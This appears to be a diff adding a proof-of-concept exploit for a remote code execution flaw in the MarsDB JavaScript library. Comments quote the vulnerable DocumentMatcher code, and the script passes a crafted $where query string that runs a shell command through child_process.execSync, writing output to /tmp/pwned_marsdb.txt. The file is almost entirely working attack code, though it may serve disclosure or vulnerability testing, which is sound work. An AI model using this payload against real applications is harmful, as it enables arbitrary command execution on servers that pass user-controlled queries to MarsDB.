@@ -1,0 +1,29 @@
+```javascript
+// Exploit for MarsDB $where remote code execution (arbitrary JS injection)
+// node_modules/marsdb/dist/DocumentMatcher.js:
+//   $where: function(selectorValue, matcher) {
+//     if (!(selectorValue instanceof Function)) {
+//       selectorValue = Function('obj', 'return ' + selectorValue);
+//     }
+//     ...
+//   }
+// A string $where value is concatenated directly into `new Function(...)`,
+// so any attacker-controlled query string is executed as arbitrary JS.
+
+const marsdb = require("marsdb");
+const Collection = marsdb.Collection;
+
+const col = new Collection("exploit_test");
+
+col.insert({ a: 1 }).then(() => {
+  return col.find({
+    // Attacker-controlled $where string executed via Function() injection
+    $where:
+      "process.mainModule.require('child_process')" +
+      ".execSync('id > /tmp/pwned_marsdb.txt'); return true",
+  }).exec();
+}).then((docs) => {
+  console.log("Query matched", docs.length, "docs");
+  console.log("Arbitrary command executed - check /tmp/pwned_marsdb.txt");
+}).catch((e) => console.error("err", e));
+```
